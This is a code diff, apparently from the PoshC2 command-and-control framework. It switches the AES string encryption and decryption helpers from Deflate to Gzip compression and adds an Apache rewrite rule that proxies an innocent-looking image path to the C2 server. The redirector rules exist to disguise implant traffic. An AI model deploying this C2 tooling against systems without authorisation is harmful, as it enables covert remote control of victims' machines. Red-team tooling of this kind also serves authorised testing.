@@ -144,23 +144,13 @@ function Encrypt-String2
 }
 
 # decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted bytes block 
-function Decrypt-String2 
-{
-    param
-    (
-        [Object]
-        $key,
-        [Object]
-        $encryptedStringWithIV
-    )
-    $bytes = $encryptedStringWithIV
-    $IV = $bytes[0..15]
-    $aesManaged = Create-AesManagedObject $key $IV
-    $decryptor = $aesManaged.CreateDecryptor()
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
-    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
+function Decrypt-String2 ($key, $bytes) {
+	$IV = $bytes[0..15]
+	$aesManaged = Create-AesManagedObject $key $IV
+	$decryptor = $aesManaged.CreateDecryptor()
+	$byteArray = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
+    $output = (New-Object IO.StreamReader ($(New-Object System.IO.Compression.GzipStream ($(New-Object IO.MemoryStream (,$byteArray)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
     $output
-    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
 
 # encryption utility using Rijndael encryption, an AES equivelant, returns encrypted base64 block 
@@ -565,6 +555,7 @@ SSLProxyCheckPeerExpire off
 Define PoshC2 <ADD_IPADDRESS_HERE>
 Define SharpSocks <ADD_IPADDRESS_HERE>
 
+RewriteRule ^/images/static/content/(.*) $uri`${PoshC2}/images/static/content/`$1 [NC,L,P]
 RewriteRule ^/news/(.*) $uri`${PoshC2}/news/`$1 [NC,L,P]
 RewriteRule ^/webapp/static/(.*) $uri`${PoshC2}/webapp/static/`$1 [NC,L,P]
 RewriteRule ^/images/prints/(.*) $uri`${PoshC2}/images/prints/`$1 [NC,L,P]
@@ -1271,7 +1262,7 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 function Encrypt-String2($key, $unencryptedString) {
     $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
     $CompressedStream = New-Object IO.MemoryStream
-    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+    $DeflateStream = New-Object System.IO.Compression.GzipStream $CompressedStream, ([IO.Compression.CompressionMode]::Compress)
     $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
     $DeflateStream.Dispose()
     $bytes = $CompressedStream.ToArray()
